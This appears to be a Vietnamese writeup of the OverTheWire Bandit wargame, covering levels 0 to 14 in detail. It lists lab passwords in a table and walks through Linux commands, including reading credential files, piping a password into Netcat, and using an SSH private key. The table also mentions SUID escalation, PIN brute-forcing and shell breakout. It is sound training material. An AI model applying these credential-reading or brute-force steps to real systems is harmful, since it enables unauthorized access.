# OverTheWire: Bandit Wargame - Writeup & Notes

> 💡 **Thông báo:** Bản tài liệu tiếng Anh chuẩn hóa với từng file level độc lập có sẵn tại **[English Writeup Hub (README.md)](README.md)**.

Repository tổng hợp writeup chi tiết, phương pháp giải và các kiến thức Linux/Security học được qua từng level của wargame [OverTheWire: Bandit](https://overthewire.org/wargames/bandit/).

---

## 📋 Bảng tổng hợp Password & Credentials

| Level | Username | Host | Port | Password / Access | Ghi chú ngắn |
|---|---|---|---|---|---|
| **Level 0** | `bandit0` | `bandit.labs.overthewire.org` | `2220` | `bandit0` | Mật khẩu mặc định để bắt đầu game |
| **Level 1** | `bandit1` | `bandit.labs.overthewire.org` | `2220` | `6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR` | Đọc file `readme` trong home directory |
| **Level 2** | `bandit2` | `bandit.labs.overthewire.org` | `2220` | `PK8fYLZg2hnHSz83plBL1iEPKdD3QToB` | Đọc file `-` (dashed filename) bằng `./-` |
| **Level 3** | `bandit3` | `bandit.labs.overthewire.org` | `2220` | `7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME` | Đọc file có dấu gạch/dấu cách bằng `./"--spaces in this filename--"` |
| **Level 4** | `bandit4` | `bandit.labs.overthewire.org` | `2220` | `xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq` | Đọc file ẩn `...Hiding-From-You` trong thư mục `inhere` |
| **Level 5** | `bandit5` | `bandit.labs.overthewire.org` | `2220` | `6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG` | Dùng lệnh `file ./*` tìm file `ASCII text` (`-file07`) |
| **Level 6** | `bandit6` | `bandit.labs.overthewire.org` | `2220` | `pXa26xhMWaC2SvDotA4r9EgZkulOeSBW` | Dùng lệnh `find inhere/ -type f -size 1033c` |
| **Level 7** | `bandit7` | `bandit.labs.overthewire.org` | `2220` | `Bmnnvf82KzQlfxgAI2d1zYbr1u9pr3E3` | Tìm trên toàn server: `find / -user bandit7 -group bandit6 -size 33c 2>/dev/null` |
| **Level 8** | `bandit8` | `bandit.labs.overthewire.org` | `2220` | `VR1ljMayciFxbnUokuQmJFw6QC9VKtub` | Dùng `grep "millionth" data.txt` (hoặc `cat data.txt \| grep "millionth"`) |
| **Level 9** | `bandit9` | `bandit.labs.overthewire.org` | `2220` | `EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl` | Dùng `sort data.txt \| uniq -u` (hoặc `uniq -c`) |
| **Level 10** | `bandit10` | `bandit.labs.overthewire.org` | `2220` | `B0s2khmbT9u0geKuOoVGW3JZKhndE3BG` | Dùng `strings data.txt \| grep "=="` |
| **Level 11** | `bandit11` | `bandit.labs.overthewire.org` | `2220` | `pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro` | Giải mã Base64: `base64 -d data.txt` (hoặc `cat data.txt \| base64 -d`) |
| **Level 12** | `bandit12` | `bandit.labs.overthewire.org` | `2220` | `GROozWPO8QyN0mGrjUkID0WCYkZiQxrN` | Giải mã ROT13 bằng `tr` hoặc công cụ CyberChef |
| **Level 13** | `bandit13` | `bandit.labs.overthewire.org` | `2220` | `qQYQiHOBPR8zR61qxYqX45quvihF2uzk` | Phục hồi Hexdump (`xxd -r`) và bóc tách 9 lớp nén (`gzip`, `bzip2`, `tar`) |
| **Level 14** | `bandit14` | `bandit.labs.overthewire.org` | `2220` | `aaWecNkG4FhxJQxz07uiwzVP6bJiYS65` | Mật khẩu đọc từ `/etc/bandit_pass/bandit14` qua SSH Key |
| **Level 15** | `bandit15` | `bandit.labs.overthewire.org` | `2220` | `pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7` | Gửi mật khẩu bandit14 qua Netcat: `nc localhost 30000` |
| **Level 16** | `bandit16` | `bandit.labs.overthewire.org` | `2220` | `kS0Hf0u5HiXFwKMKFqXvPdOTNGGa0X8V` | Gửi mật khẩu bandit15 qua SSL/TLS: `openssl s_client -quiet -connect localhost:30001` |
| **Level 17** | `bandit17` | `bandit.labs.overthewire.org` | `2220` | `SSH Private Key` (file `bandit17.key`) | Quét cổng SSL `31790` bằng `nmap` và gửi pass qua `openssl s_client` |
| **Level 18** | `bandit18` | `bandit.labs.overthewire.org` | `2220` | `OQxXZjELndr90zuhOTDYBEomI0SZITXI` | So sánh 2 file `passwords.old` và `passwords.new` bằng `diff` |
| **Level 19** | `bandit19` | `bandit.labs.overthewire.org` | `2220` | `KpsOfPkcP7i1FlIExk2QEjyt6dw8dxZI` | Bỏ qua `.bashrc` logout bằng SSH direct command: `ssh ... "cat readme"` |
| **Level 20** | `bandit20` | `bandit.labs.overthewire.org` | `2220` | `4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA` | Leo thang đặc quyền bằng file nhị phân SUID: `./bandit20-do` |
| **Level 21** | `bandit21` | `bandit.labs.overthewire.org` | `2220` | `bW9kBv5WC3P4yoDyf12LSdGuNz5ka6hY` | Mở Netcat listener gửi pass bandit20 và kết nối bằng file SUID: `./suconnect <port>` |
| **Level 22** | `bandit22` | `bandit.labs.overthewire.org` | `2220` | `RYVux2rHEm9tiXHmLFzuR7Vhx6AZQMEz` | Phân tích Cron job định kỳ trong thư mục `/etc/cron.d/` |
| **Level 23** | `bandit23` | `bandit.labs.overthewire.org` | `2220` | `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw` | Dịch ngược thuật toán MD5 hash trong script `/usr/bin/cronjob_bandit23.sh` |
| **Level 24** | `bandit24` | `bandit.labs.overthewire.org` | `2220` | `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv` | Tạo Custom Shell Script để Cron job của `bandit24` thực thi và copy mật khẩu |
| **Level 25** | `bandit25` | `bandit.labs.overthewire.org` | `2220` | `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P` | Brute-force 10.000 mã PIN (0000-9999) qua cổng `30002` bằng vòng lặp Bash + Netcat |
| **Level 26** | `bandit26` | `bandit.labs.overthewire.org` | `2220` | `jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ` | Thoát khỏi Restricted Shell (`more` -> `vi` breakout) bằng cách thu nhỏ kích thước terminal |
| **Level 27** | `bandit27` | `bandit.labs.overthewire.org` | `2220` | *(Đang cập nhật...)* | Thoát ra Bash shell từ `vi` và thực thi file SUID: `./bandit27-do` |

---

## 🚀 Chi tiết Writeup từng Level

### 🔹 Bandit Level 0 ➜ Level 1

#### 1. Mục tiêu (Objective)
Đăng nhập vào hệ thống bằng SSH ở tài khoản `bandit0`, sau đó tìm mật khẩu cho `bandit1` trong file `readme` tại thư mục home.

#### 2. Quá trình thực hiện (Walkthrough)
1. **Kết nối SSH vào Level 0:**
   ```bash
   ssh bandit0@bandit.labs.overthewire.org -p 2220
   # Password: bandit0
   ```

2. **Kiểm tra vị trí thư mục hiện tại:**
   ```bash
   pwd
   # Output: /home/bandit0
   ```

3. **Liệt kê chi tiết toàn bộ file (bao gồm file ẩn):**
   ```bash
   ls -la
   # Thấy xuất hiện file: readme
   ```

4. **Đọc nội dung file `readme` để lấy mật khẩu:**
   ```bash
   cat readme
   ```

#### 3. Kết quả & Password thu được
* **Password Bandit 1:** `6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR`

---

### 🔹 Bandit Level 1 ➜ Level 2

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit1` bằng mật khẩu vừa tìm được, sau đó đọc mật khẩu cho `bandit2` được lưu trong file có tên đặc biệt là `-` (dấu gạch nối) tại thư mục home.

#### 2. Thách thức kỹ thuật
* Trong môi trường Linux/Bash, dấu `-` thường đại diện cho `stdin` (luồng nhập chuẩn) hoặc tiền tố tham số cho các câu lệnh. Lệnh `cat -` thông thường sẽ khiến terminal đứng chờ nhập liệu từ bàn phím thay vì đọc file `-`.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên SSH hiện tại từ `bandit0`:**
   ```bash
   exit
   ```

2. **Kết nối SSH vào Level 1 từ máy local:**
   ```bash
   ssh bandit1@bandit.labs.overthewire.org -p 2220
   # Password: 6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR
   ```

3. **Kiểm tra file trong thư mục home:**
   ```bash
   ls -la
   # Nhìn thấy file tên: -
   ```

4. **Đọc nội dung file `-`:**
   * **Cách 1 - Dùng đường dẫn tương đối:**
     ```bash
     cat ./-
     ```
   * **Cách 2 - Dùng Text Editor trên Terminal (nano/vim):**
     ```bash
     nano ./-
     ```

#### 4. Kết quả & Password thu được
* **Password Bandit 2:** `PK8fYLZg2hnHSz83plBL1iEPKdD3QToB`

---

### 🔹 Bandit Level 2 ➜ Level 3

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit2` và tìm mật khẩu cho `bandit3` được lưu trong một file có chứa dấu cách và dấu gạch ngang ở tên: `--spaces in this filename--`.

#### 2. Thách thức kỹ thuật
* **Khoảng trắng (Spaces):** Trong Linux Shell, khoảng trắng dùng để phân tách các tham số. Nếu không bao bọc hoặc escape, shell sẽ tách thành nhiều từ riêng biệt.
* **Dấu gạch ngang đầu (`--`):** Lệnh `cat` hiểu chuỗi bắt đầu bằng `--` là cờ tham số (Option/Flag).

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit1` và kết nối vào `bandit2`:**
   ```bash
   exit
   ssh bandit2@bandit.labs.overthewire.org -p 2220
   # Password: PK8fYLZg2hnHSz83plBL1iEPKdD3QToB
   ```

2. **Liệt kê file:**
   ```bash
   ls -la
   ```

3. **Đọc nội dung file:**
   * **Cách 1 - Dùng tiền tố đường dẫn `./` kết hợp ngoặc kép:**
     ```bash
     cat ./"--spaces in this filename--"
     ```
   * **Cách 2 - Dùng dấu phân tách `--` (POSIX standard):**
     ```bash
     cat -- "--spaces in this filename--"
     ```

#### 4. Kết quả & Password thu được
* **Password Bandit 3:** `7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME`

---

### 🔹 Bandit Level 3 ➜ Level 4

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit3` và tìm mật khẩu cho `bandit4` được lưu trong một **file ẩn (hidden file)** bên trong thư mục **`inhere`**.

#### 2. Thách thức kỹ thuật
* Trong Linux, các file bắt đầu bằng dấu chấm `.` (ví dụ `...Hiding-From-You`) là file ẩn. Lệnh `ls` thông thường sẽ không hiển thị các file này, bắt buộc phải dùng cờ `-a` (all) hoặc `-la`.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit2` và kết nối vào `bandit3`:**
   ```bash
   exit
   ssh bandit3@bandit.labs.overthewire.org -p 2220
   # Password: 7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME
   ```

2. **Di chuyển vào thư mục `inhere`:**
   ```bash
   cd inhere
   ```

3. **Liệt kê toàn bộ file (bao gồm file ẩn):**
   ```bash
   ls -la
   # Thấy xuất hiện file ẩn có 3 dấu chấm ở đầu: ...Hiding-From-You
   ```

4. **Đọc nội dung file ẩn:**
   ```bash
   cat ...Hiding-From-You
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 4:** `xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq`

---

### 🔹 Bandit Level 4 ➜ Level 5

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit4` và tìm mật khẩu cho `bandit5`. Mật khẩu được lưu trong **tệp duy nhất có thể đọc được bằng mắt thường (human-readable / ASCII text)** bên trong thư mục `inhere`.

#### 2. Thách thức kỹ thuật
* Trong thư mục `inhere` có 10 file khác nhau (`-file00` đến `-file09`), nhưng hầu hết là file nhị phân (`data`). Cần dùng công cụ nhận diện định dạng file `file`.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit3` và kết nối vào `bandit4`:**
   ```bash
   exit
   ssh bandit4@bandit.labs.overthewire.org -p 2220
   # Password: xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq
   ```

2. **Vào thư mục `inhere` và kiểm tra định dạng tất cả file:**
   ```bash
   cd inhere
   file ./*
   # Kết quả: ./-file07: ASCII text
   ```

3. **Đọc nội dung file `-file07`:**
   ```bash
   cat ./-file07
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 5:** `6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG`

---

### 🔹 Bandit Level 5 ➜ Level 6

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit5` và tìm mật khẩu cho `bandit6`. Mật khẩu nằm trong thư mục `inhere` và thỏa mãn:
* Human-readable.
* Size chính xác 1033 bytes.
* Not executable.

#### 2. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit4` và kết nối vào `bandit5`:**
   ```bash
   exit
   ssh bandit5@bandit.labs.overthewire.org -p 2220
   # Password: 6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG
   ```

2. **Dùng lệnh `find` lọc file theo kích thước 1033 bytes:**
   ```bash
   find inhere/ -type f -size 1033c
   # Kết quả trả về file: inhere/maybehere07/.file2
   ```

3. **Đọc nội dung file tìm được:**
   ```bash
   cat inhere/maybehere07/.file2
   ```

#### 3. Kết quả & Password thu được
* **Password Bandit 6:** `pXa26xhMWaC2SvDotA4r9EgZkulOeSBW`

---

### 🔹 Bandit Level 6 ➜ Level 7

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit6` và tìm mật khẩu cho `bandit7`. Mật khẩu được lưu **ở bất kỳ đâu trên toàn bộ máy chủ (somewhere on the server)** và thỏa mãn cả 3 điều kiện:
1. Thuộc sở hữu của user: **`bandit7`** (`owned by user bandit7`).
2. Thuộc sở hữu của group: **`bandit6`** (`owned by group bandit6`).
3. Kích thước đúng **`33 bytes`** (`33 bytes in size`).

#### 2. Thách thức kỹ thuật
* Khi tìm kiếm từ thư mục gốc `/`, tài khoản không có quyền root sẽ gặp rất nhiều thư mục bị cấm truy cập (`Permission denied`). Cần kỹ thuật chuyển hướng lỗi `2>/dev/null` để lọc sạch kết quả.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit5` và kết nối vào `bandit6`:**
   ```bash
   exit
   ssh bandit6@bandit.labs.overthewire.org -p 2220
   # Password: pXa26xhMWaC2SvDotA4r9EgZkulOeSBW
   ```

2. **Dùng `find` quét từ thư mục gốc `/` kết hợp lọc `2>/dev/null`:**
   ```bash
   find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
   # Kết quả tìm thấy: /var/lib/dpkg/info/bandit7.password
   ```

3. **Đọc nội dung file:**
   ```bash
   cat /var/lib/dpkg/info/bandit7.password
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 7:** `Bmnnvf82KzQlfxgAI2d1zYbr1u9pr3E3`

---

### 🔹 Bandit Level 7 ➜ Level 8

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit7` và tìm mật khẩu cho `bandit8`. Mật khẩu nằm trong file **`data.txt`** ngay cạnh từ **`millionth`**.

#### 2. Thách thức kỹ thuật & Kiến thức cốt lõi về Pipe (`|`)
* **File có dung lượng rất lớn:** `data.txt` chứa hàng triệu dòng dữ liệu (hơn 4.1MB text). Mở bằng editor thông thường sẽ bị đơ, không thể dò bằng mắt.
* **Toán tử Pipe (`|`) trong Linux:**
  * **Bản chất:** Ký tự gạch đứng `|` (Pipe - đường ống dẫn) dùng để **chuyển hướng đầu ra (stdout) của lệnh phía trước làm đầu vào (stdin) cho lệnh phía sau** mà không cần lưu ra file tạm.
  * **Cú pháp:** `Command_A | Command_B`
  * **Ý nghĩa thực tế:** Trong lệnh `cat data.txt | grep "millionth"`, lệnh `cat` đọc toàn bộ file `data.txt`, sau đó "bơm" trực tiếp luồng văn bản đó qua ống dẫn `|` để lệnh `grep` lọc và in ra đúng dòng có từ `"millionth"`.
  * **Triết lý Unix:** *"Mỗi chương trình làm tốt một nhiệm vụ duy nhất, và kết nối chúng lại bằng Pipe để giải quyết bài toán phức tạp"*.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit6` và kết nối vào `bandit7`:**
   ```bash
   exit
   ssh bandit7@bandit.labs.overthewire.org -p 2220
   # Password: Bmnnvf82KzQlfxgAI2d1zYbr1u9pr3E3
   ```

2. **Kiểm tra thông tin file trong thư mục home:**
   ```bash
   ls -la
   # Thấy file data.txt dung lượng ~4.1MB
   ```

3. **Tìm dòng chứa từ khóa `millionth` trong file `data.txt`:**
   * **Cách 1 - Dùng pipe kết hợp `cat` và `grep`:**
     ```bash
     cat data.txt | grep "millionth"
     ```
   * **Cách 2 - Dùng trực tiếp lệnh `grep` trên file:**
     ```bash
     grep "millionth" data.txt
     ```

#### 4. Kết quả & Password thu được
* **Password Bandit 8:** `VR1ljMayciFxbnUokuQmJFw6QC9VKtub`

---

### 🔹 Bandit Level 8 ➜ Level 9

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit8` và tìm mật khẩu cho `bandit9`. Mật khẩu nằm trong file **`data.txt`** và là **dòng văn bản duy nhất chỉ xuất hiện đúng 1 lần (occurs only once)** trong toàn bộ file.

#### 2. Thách thức kỹ thuật & Cơ chế hoạt động của `uniq`
* **Lệnh `uniq`:** Dùng để lọc bỏ các dòng trùng lặp.
  * Tham số `-u` (unique): Chỉ in ra những dòng xuất hiện duy nhất 1 lần.
  * Tham số `-c` (count): Đếm và in số lần xuất hiện của từng dòng.
* **⚠️ Lưu ý sống còn:** `uniq` chỉ so sánh các dòng nằm **kề nhau**. Do đó bắt buộc phải dùng lệnh `sort` trước để gom các dòng trùng nhau lại cạnh nhau, sau đó mới truyền qua `uniq`.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit7` và kết nối vào `bandit8`:**
   ```bash
   exit
   ssh bandit8@bandit.labs.overthewire.org -p 2220
   # Password: VR1ljMayciFxbnUokuQmJFw6QC9VKtub
   ```

2. **Sắp xếp và lọc dòng duy nhất:**
   * **Cách 1 - Chỉ in dòng duy nhất với `-u`:**
     ```bash
     sort data.txt | uniq -u
     ```
   * **Cách 2 - Đếm số lần xuất hiện với `-c`:**
     ```bash
     sort data.txt | uniq -c
     # Tìm dòng có số đếm là 1
     ```

#### 4. Kết quả & Password thu được
* **Password Bandit 9:** `EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl`

---

### 🔹 Bandit Level 9 ➜ Level 10

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit9` và tìm mật khẩu cho `bandit10`. Mật khẩu nằm trong file **`data.txt`**, là một trong số ít các chuỗi có thể đọc được bằng mắt thường (human-readable strings) và được bắt đầu bởi nhiều ký tự **`=`** (`preceded by several '=' characters`).

#### 2. Thách thức kỹ thuật & Sức mạnh của lệnh `strings`
* **File nhị phân (Binary file):** `data.txt` ở màn này là file nhị phân. Nếu dùng `grep "==" data.txt` trực tiếp, `grep` sẽ chỉ báo `grep: data.txt: binary file matches` chứ không in nội dung dòng ra màn hình.
* **Lệnh `strings`:** Chuyên dùng trong Reverse Engineering và Forensics để quét và trích xuất tất cả các đoạn chuỗi văn bản ASCII có nghĩa từ file nhị phân, bỏ qua các byte rác máy tính.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit8` và kết nối vào `bandit9`:**
   ```bash
   exit
   ssh bandit9@bandit.labs.overthewire.org -p 2220
   # Password: EjmOSvuAu7sGAHqHVcBDPirRe9T03kxl
   ```

2. **Thử nghiệm với `grep` thông thường:**
   ```bash
   grep "==" data.txt
   # Output: grep: data.txt: binary file matches
   ```

3. **Dùng `strings` trích xuất text kết hợp lọc `grep`:**
   ```bash
   strings data.txt | grep "=="
   # Output:
   # ========== the
   # [==p+
   # ========== password
   # Y========== is
   # ========== B0s2khmbT9u0geKuOoVGW3JZKhndE3BG
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 10:** `B0s2khmbT9u0geKuOoVGW3JZKhndE3BG`

---

### 🔹 Bandit Level 10 ➜ Level 11

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit10` và tìm mật khẩu cho `bandit11`. Mật khẩu được lưu trong file **`data.txt`** chứa dữ liệu đã bị mã hóa dạng **Base64** (`contains base64 encoded data`).

#### 2. Thách thức kỹ thuật
* Dữ liệu trong `data.txt` là chuỗi ký tự Base64. Cần giải mã (decode) dữ liệu này về dạng văn bản thuần để đọc được mật khẩu.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit9` và kết nối vào `bandit10`:**
   ```bash
   exit
   ssh bandit10@bandit.labs.overthewire.org -p 2220
   # Password: B0s2khmbT9u0geKuOoVGW3JZKhndE3BG
   ```

2. **Giải mã Base64:**
   * **Cách 1 - Dùng pipe kết hợp `cat` và `base64 -d`:**
     ```bash
     cat data.txt | base64 -d
     ```
   * **Cách 2 - Dùng trực tiếp lệnh `base64 -d`:**
     ```bash
     base64 -d data.txt
     ```

#### 4. Kết quả & Password thu được
* **Password Bandit 11:** `pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro`

---

### 🔹 Bandit Level 11 ➜ Level 12

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit11` và tìm mật khẩu cho `bandit12`. Mật khẩu nằm trong file **`data.txt`**, trong đó toàn bộ chữ cái thường (`a-z`) và chữ cái hoa (`A-Z`) đã bị **dịch chuyển 13 vị trí (ROT13 - rotated by 13 positions)**.

#### 2. Thách thức kỹ thuật & Thuật toán ROT13
* **ROT13 (Rotate by 13 places):** Là một dạng mật mã Caesar thay thế ký tự bằng ký tự cách nó 13 vị trí trong bảng 26 chữ cái tiếng Anh.
* **Tính chất đối xứng:** Giải mã và mã hóa ROT13 là như nhau.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit10` và kết nối vào `bandit11`:**
   ```bash
   exit
   ssh bandit11@bandit.labs.overthewire.org -p 2220
   # Password: pYfOY6HwUsDj5rL9UvyhU7MCmv8vN5Ro
   ```

2. **Giải mã ROT13:**
   * **Cách 1 - Dùng lệnh `tr` trên Linux Terminal:**
     ```bash
     cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
     ```
   * **Cách 2 - Dùng công cụ Web CyberChef:**
     * Mở công cụ CyberChef, dán nội dung từ `data.txt` vào mục Input.
     * Chọn Recipe: **`ROT13`** (với Amount: `13`).
     * Nhận kết quả plaintext ở Output.

#### 4. Kết quả & Password thu được
* **Password Bandit 12:** `GROozWPO8QyN0mGrjUkID0WCYkZiQxrN`

---

### 🔹 Bandit Level 12 ➜ Level 13

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit12` và tìm mật khẩu cho `bandit13`. Mật khẩu nằm trong file **`data.txt`**, là một bản **Hexdump** của một tệp tin đã bị **nén lặp đi lặp lại nhiều lần bằng các thuật toán nén khác nhau (repeatedly compressed)**.

#### 2. Thách thức kỹ thuật & Chuỗi bóc tách nén đa tầng
* Tệp tin được lồng ghép qua **9 lớp nén khác nhau** theo thứ tự:
  1. `From Hexdump` (Phục hồi dữ liệu nhị phân)
  2. `Gunzip` (giải nén gzip)
  3. `Bzip2 Decompress` (giải nén bzip2)
  4. `Gunzip` (giải nén gzip)
  5. `Untar` (giải nén tar)
  6. `Untar` (giải nén tar)
  7. `Bzip2 Decompress` (giải nén bzip2)
  8. `Untar` (giải nén tar)
  9. `Gunzip` (giải nén gzip)
  10. Ra văn bản thuần chứa mật khẩu!

#### 3. Quá trình thực hiện (Walkthrough)
1. **Thoát phiên `bandit11` và kết nối vào `bandit12`:**
   ```bash
   exit
   ssh bandit12@bandit.labs.overthewire.org -p 2220
   # Password: GROozWPO8QyN0mGrjUkID0WCYkZiQxrN
   ```

2. **Cách 1 - Sử dụng CyberChef (Trực quan & Nhanh chóng):**
   * Dán toàn bộ Hexdump vào Input.
   * Xây dựng Recipe tuần tự:
     * `From Hexdump`
     * `Gunzip`
     * `Bzip2 Decompress`
     * `Gunzip`
     * `Untar`
     * `Untar`
     * `Bzip2 Decompress`
     * `Untar`
     * `Gunzip`
   * Output nhận được: `The password is qQYQiHOBPR8zR61qxYqX45quvihF2uzk`

3. **Cách 2 - Thao tác trực tiếp trên Linux CLI (trong thư mục `/tmp`):**
   ```bash
   mkdir /tmp/mywork_bandit12 && cd /tmp/mywork_bandit12
   cp ~/data.txt .
   xxd -r data.txt > file_raw
   file file_raw # Gzip
   mv file_raw file_raw.gz && gzip -d file_raw.gz
   file file_raw # Bzip2
   mv file_raw file_raw.bz2 && bzip2 -d file_raw.bz2
   file file_raw # Gzip
   mv file_raw file_raw.gz && gzip -d file_raw.gz
   file file_raw # Tar
   tar -xf file_raw
   file data5.bin # Tar
   tar -xf data5.bin
   file data6.bin # Bzip2
   bzip2 -d data6.bin # -> data6.bin.out
   file data6.bin.out # Tar
   tar -xf data6.bin.out # -> data8.bin
   file data8.bin # Gzip
   mv data8.bin data8.bin.gz && gzip -d data8.bin.gz
   cat data8.bin # -> The password is...
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 13:** `qQYQiHOBPR8zR61qxYqX45quvihF2uzk`

---

### 🔹 Bandit Level 13 ➜ Level 14

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit13` và tìm mật khẩu cho `bandit14`. Mật khẩu nằm ở file **`/etc/bandit_pass/bandit14`** và chỉ có thể đọc bởi user `bandit14`.
Ở màn này, người chơi không nhận mật khẩu dạng chuỗi văn bản thông thường mà nhận được một **khóa bảo mật SSH riêng tư (SSH Private Key: `sshkey.private`)** để đăng nhập vào `bandit14`.

#### 2. Thách thức kỹ thuật & Phân tích cạm bẫy bảo mật SSH

1. **Thay đổi kiến trúc của OverTheWire (Chặn SSH Localhost):**
   * Trong các phiên bản gần đây, máy chủ OverTheWire đã chặn việc kết nối SSH trực tiếp giữa các level thông qua `localhost` để tối ưu hóa tài nguyên server (được nêu rõ trong file `HINT`).
   * Do đó, người chơi cần trích xuất file Private Key về máy tính cá nhân để thực hiện kết nối SSH thẳng vào `bandit14`.

2. **Cơ chế kiểm soát quyền nghiêm ngặt của OpenSSH (`Permissions are too open`):**
   * OpenSSH bắt buộc file Private Key phải được bảo mật tuyệt đối. Nếu file có quyền truy cập quá rộng rãi như `0777` (`rwxrwxrwx` - cho phép bất kỳ ai đọc/ghi), OpenSSH sẽ tự động từ chối nạp key vì lý do an toàn.
   * File key bắt buộc phải được gán quyền **`600`** (`rw-------`: chỉ duy nhất chủ sở hữu được đọc và ghi).

3. **Lưu ý quan trọng trên môi trường WSL (Windows Subsystem for Linux):**
   * Các thư mục nằm trên phân vùng Windows mount sang (như `/mnt/d/`) sử dụng định dạng NTFS, mặc định WSL gán quyền `0777` và lệnh `chmod 600` sẽ không có tác dụng thực sự.
   * Để lệnh `chmod 600` hoạt động chính xác, người chơi cần sao chép file key vào thư mục gốc của Linux (như `~` hoặc `/tmp` trên hệ thống Ext4).

#### 3. Quá trình thực hiện (Walkthrough)

1. **Đăng nhập vào `bandit13` và kiểm tra file khóa:**
   ```bash
   ssh bandit13@bandit.labs.overthewire.org -p 2220
   # Password: qQYQiHOBPR8zR61qxYqX45quvihF2uzk
   ls -la
   # Thấy xuất hiện file: sshkey.private
   ```

2. **Trích xuất Private Key về máy cá nhân:**
   * **Cách 1 - Đọc và sao chép nội dung:**
     ```bash
     cat sshkey.private
     ```
     Sao chép toàn bộ khối `-----BEGIN OPENSSH PRIVATE KEY-----` ... `-----END OPENSSH PRIVATE KEY-----` và lưu thành file `bandit14` trên máy local.
   * **Cách 2 - Dùng SCP:**
     ```bash
     scp -P 2220 bandit13@bandit.labs.overthewire.org:sshkey.private ./bandit14
     ```

3. **Phân quyền và kết nối vào `bandit14` (trên WSL/Linux):**
   ```bash
   # Sao chép vào thư mục Linux home để đảm bảo quyền hạn có hiệu lực
   cp bandit14 ~/.bandit14.key
   
   # Thiết lập quyền riêng tư nghiêm ngặt (chỉ chủ sở hữu đọc/ghi)
   chmod 600 ~/.bandit14.key
   
   # Kết nối SSH vào bandit14
   ssh -i ~/.bandit14.key bandit14@bandit.labs.overthewire.org -p 2220
   ```

4. **Đọc mật khẩu của Bandit 14:**
   ```bash
   cat /etc/bandit_pass/bandit14
   ```

#### 4. Kết quả & Password thu được
* **Password Bandit 14:** `aaWecNkG4FhxJQxz07uiwzVP6bJiYS65`
* **Phương thức xác thực:** Sử dụng file `sshkey.private` (OpenSSH Private Key).

---

### 🔹 Bandit Level 14 ➜ Level 15

#### 1. Mục tiêu (Objective)
Đăng nhập vào tài khoản `bandit14` và tìm mật khẩu cho `bandit15`. Mật khẩu của level tiếp theo được lấy bằng cách gửi mật khẩu của level hiện tại (`bandit14`) tới **cổng 30000 trên localhost** (`port 30000 on localhost`).

#### 2. Thách thức kỹ thuật & Giao tiếp Socket mạng bằng Netcat
* **Netcat (`nc`):** Tiện ích dòng lệnh mạnh mẽ dùng để đọc/ghi dữ liệu qua các kết nối mạng mạng TCP/UDP.
* **Gửi dữ liệu qua Socket:**
  * Có thể kết nối trực tiếp `nc localhost 30000` rồi dán chuỗi mật khẩu vào.
  * Hoặc dùng toán tử Pipe kết hợp `cat /etc/bandit_pass/bandit14 | nc localhost 30000` để tự động hóa quá trình gửi và nhận phản hồi.

#### 3. Quá trình thực hiện (Walkthrough)
1. **Kiểm tra mật khẩu của level hiện tại (`bandit14`):**
   ```bash
   cat /etc/bandit_pass/bandit14
   # Output: aaWecNkG4FhxJQxz07uiwzVP6bJiYS65
   ```

2. **Gửi mật khẩu tới cổng 30000 qua Netcat (`nc`):**
   ```bash
   cat /etc/bandit_pass/bandit14 | nc localhost 30000
   ```
   *Server phản hồi:*
   ```text
   Correct!
   pbLYuZtTg4MgaqfJx8jbA9gKKGqM68A7
   ```

#### 4. Kết quả & Password thu được
